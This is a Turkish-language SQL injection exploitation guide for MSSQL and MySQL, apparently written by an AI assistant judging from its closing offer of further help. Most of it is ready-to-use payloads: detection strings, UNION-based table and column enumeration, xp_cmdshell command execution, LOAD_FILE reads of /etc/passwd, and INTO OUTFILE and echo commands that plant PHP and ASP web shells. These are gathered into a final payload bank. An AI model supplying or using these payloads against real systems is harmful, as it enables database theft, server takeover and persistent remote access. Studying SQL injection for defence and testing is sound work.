### **SQL Injection: Tespit ve İstismar Rehberi (Manuel Tekniklerle)**

SQL Injection, bir saldırganın kullanıcı girdisi yoluyla bir uygulamanın veritabanı sorgularını manipüle etmesine olanak tanıyan bir zafiyettir. MSSQL ve MySQL veritabanları için tespit, istismar ve çeşitli shell alma yöntemleri aşağıda detaylı olarak açıklanmıştır.

---

## **1. SQL Injection Nedir?**
SQL Injection, genellikle şu amaçlarla kullanılır:
- Hassas verilerin okunması (ör. kullanıcı adları, şifreler).
- Yetkilendirme atlatma.
- Veritabanındaki verilerin değiştirilmesi veya silinmesi.
- Komut yürütme (özellikle MSSQL'de).

---

## **2. SQL Injection Nasıl Tespit Edilir?**
SQL Injection zafiyetini tespit etmek için aşağıdaki yöntemleri kullanabilirsiniz:

### **2.1. Potansiyel Giriş Noktalarını Bulma**
- **URL Parametreleri**: `/product?id=1`
- **Form Alanları**: Arama kutusu, giriş formu.
- **HTTP Header'ları**: `Referer`, `User-Agent`, `Cookie`.

### **2.2. Tespit İçin Kullanılan Payloadlar**
#### **Basit Test Payloadları**
```plaintext
' OR '1'='1
" OR "1"="1
' OR 1=1 --
" OR 1=1 --
```
Eğer bu payloadlar kullanıldığında farklı veya beklenmeyen bir çıktı oluşuyorsa, uygulama SQL Injection'a duyarlıdır.

#### **Hata Tabanlı Payloadlar**
```plaintext
'
" 
') 
") 
'-- 
"-- 
```
Hata mesajında SQL sorgusu veya veritabanı türüyle ilgili bilgi görünüyorsa, zafiyet mevcut olabilir.

#### **Boolean Tabanlı Testler**
```plaintext
1' AND 1=1 --
1' AND 1=2 --
```
- `AND 1=1` ile doğru bir durum kontrol edilir.
- `AND 1=2` ile yanlış bir durum test edilir.
Sonuçlar arasında fark varsa, SQL Injection ihtimali yüksektir.

#### **Time-Based Blind Test**
```plaintext
1' AND SLEEP(5) --
1' AND IF(1=1, SLEEP(5), 0) --
```
Yanıtın gecikmesi, SQL Injection zafiyetini gösterebilir.

---

## **3. MSSQL ve MySQL İçin İstismar Teknikleri**

### **3.1. MSSQL İçin SQL Injection**
#### **3.1.1. Veritabanı Adını ve Versiyonunu Bulma**
- **Veritabanı Adı**:
  ```sql
  1' UNION SELECT DB_NAME() --
  ```
- **Versiyon Bilgisi**:
  ```sql
  1' UNION SELECT @@VERSION --
  ```

#### **3.1.2. Tablo ve Kolon Bilgilerini Keşfetme**
- **Tablo Adlarını Listeleme**:
  ```sql
  1' UNION SELECT table_name FROM information_schema.tables --
  ```
- **Kolon Adlarını Listeleme**:
  ```sql
  1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
  ```

#### **3.1.3. Komut Yürütme (xp_cmdshell ile)**
MSSQL'de, `xp_cmdshell` etkinleştirilmişse, komut yürütülebilir:
```sql
1'; EXEC xp_cmdshell 'whoami'; --
```

#### **3.1.4. Dosya Yazma**
Shell yazılımı yüklemek için dosya yazabilirsiniz:
```sql
1'; EXEC xp_cmdshell 'echo ^<%execute request("cmd")%^> > C:\inetpub\wwwroot\shell.asp'; --
```

---

### **3.2. MySQL İçin SQL Injection**
#### **3.2.1. Veritabanı Adını ve Versiyonunu Bulma**
- **Veritabanı Adı**:
  ```sql
  1' UNION SELECT DATABASE() --
  ```
- **Versiyon Bilgisi**:
  ```sql
  1' UNION SELECT @@VERSION --
  ```

#### **3.2.2. Tablo ve Kolon Bilgilerini Keşfetme**
- **Tablo Adlarını Listeleme**:
  ```sql
  1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() --
  ```
- **Kolon Adlarını Listeleme**:
  ```sql
  1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
  ```

#### **3.2.3. Dosya Okuma (LOAD_FILE ile)**
MySQL'de `LOAD_FILE` fonksiyonunu kullanarak dosyaları okuyabilirsiniz:
```sql
1' UNION SELECT LOAD_FILE('/etc/passwd') --
```

#### **3.2.4. Dosya Yazma (INTO OUTFILE ile)**
Dosya yazmak için `INTO OUTFILE` kullanılabilir:
```sql
1' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
```

---

## **4. Shell Alma ve Dosya Yükleme Teknikleri**
### **4.1. MSSQL'de Shell Alma**
1. **xp_cmdshell ile ASP Shell Yükleme**:
   ```sql
   1'; EXEC xp_cmdshell 'echo ^<%execute request("cmd")%^> > C:\inetpub\wwwroot\shell.asp'; --
   ```
2. Shell'e tarayıcıdan erişim:
   ```plaintext
   http://victim.com/shell.asp?cmd=dir
   ```

### **4.2. MySQL'de Shell Alma**
1. **Dosya Yazma**:
   ```sql
   1' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
   ```
2. Shell'e tarayıcıdan erişim:
   ```plaintext
   http://victim.com/shell.php?cmd=ls
   ```

---

## **5. Genel Payload Bankası**
### **Hata Tabanlı SQL Injection**
```sql
1' AND 1=1 --
1' AND 1=2 --
1' AND SLEEP(5) --
```

### **Birleşim (UNION) Tabanlı SQL Injection**
```sql
1' UNION SELECT NULL, NULL, NULL --
1' UNION SELECT 1, 'test', @@VERSION --
```

### **Tablo ve Kolon Keşfi**
```sql
1' UNION SELECT table_name FROM information_schema.tables --
1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
```

### **Komut Yürütme (MSSQL)**
```sql
1'; EXEC xp_cmdshell 'dir'; --
```

### **Dosya Okuma ve Yazma (MySQL)**
```sql
1' UNION SELECT LOAD_FILE('/etc/passwd') --
1' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
```

---

Bu rehberde hem **MSSQL** hem de **MySQL** için SQL Injection tespiti ve istismar teknikleri açıklanmıştır. Ek olarak, shell alma ve dosya yükleme gibi ileri düzey istismar yöntemleri de detaylandırılmıştır. Daha fazla bilgi veya spesifik bir senaryo için yardımcı olabilirim.
